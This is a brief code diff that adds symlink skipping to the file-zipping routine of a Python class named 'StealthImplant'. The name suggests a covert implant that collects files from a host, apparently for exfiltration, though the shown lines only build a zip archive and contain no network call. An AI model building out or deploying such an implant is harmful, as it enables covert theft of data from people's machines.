@@ -96,6 +96,10 @@ class StealthImplant:
         zip_buffer = BytesIO()
         with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
             for path in files:
+                if path.is_symlink():
+                    self._log(f"skipped {path}: symlink")
+                    continue
+
                 try:
                     arcname = str(Path(self.root_dir.name)/ path.relative_to(self.root_dir))
                     zf.write(path, arcname)
